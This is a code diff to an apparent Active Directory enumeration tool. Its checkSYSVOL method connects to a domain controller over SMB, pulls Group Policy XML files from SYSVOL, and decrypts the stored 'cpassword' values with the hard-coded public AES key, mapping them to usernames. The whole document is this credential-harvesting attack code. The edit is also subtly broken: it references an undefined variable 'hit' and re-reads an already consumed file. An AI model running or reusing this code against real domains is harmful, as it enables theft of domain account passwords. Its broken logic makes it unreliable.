@@ -251,7 +251,7 @@ class EnumAD():
     
 
     def checkSYSVOL(self):
-        cpasswords = []
+        cpasswords = {}
         #try:
         smbconn = smbconnection.SMBConnection('\\\\{0}\\'.format(self.server), self.server, timeout=5)
         smbconn.login(self.domuser, self.passwd)
@@ -270,22 +270,26 @@ class EnumAD():
                     except (SessionError, UnicodeEncodeError, NetBIOSError) as e:
                         continue
                 
+                # Compile regexes for username and passwords
                 cpassRE = re.compile(r'cpassword=\"([a-zA-Z0-9/]+)\"')
-                #cpassRE = re.compile(r'Version=([a-zA-Z0-9]+)')
+                unameRE = re.compile(r'userName=\"([ a-zA-Z0-9/\(\)-]+)\"')
+
+                # Prepare the ciphers based on MSDN article with key and IV
                 cipher = AES.new(bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b'), AES.MODE_CBC, '\x00' * 16)
+                
                 # Since the first entry is the DC we dont want that
                 for item in paths[1:]:
-                    #if '.' in item.split('\\')[-1]:
                     if '.xml' in item.split('\\')[-1]:
                         with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'wb') as f:
                             smbconn.getFile(str(share['shi1_netname']).rstrip('\0'), item, f.write)             
                         with open('file-content-{0}-{1}.log'.format(item.split('\\')[-2], item.split('\\')[-1]), 'r') as f:
                             try:
-                                match = cpassRE.findall(f.read())
-                                #cpasswords.append(match.group(0))
-                                for hit in match:
-                                    padding = '=' * (4 - len(hit) % 4) 
-                                    cpasswords.append(cipher.decrypt(base64.b64decode(bytes(hit + padding, 'utf-8'))).strip())
+                                passwdMatch = cpassRE.findall(f.read())
+                                for passwd in passwdMatch:
+                                    unameMatch = unameRE.findall(f.read())
+                                    for usr in unameMatch:
+                                        padding = '=' * (4 - len(hit) % 4) 
+                                        cpasswords[usr] = cipher.decrypt(base64.b64decode(bytes(passwd + padding, 'utf-8'))).strip()
                             except (UnicodeDecodeError, AttributeError) as e:
                                 continue
         print(cpasswords)
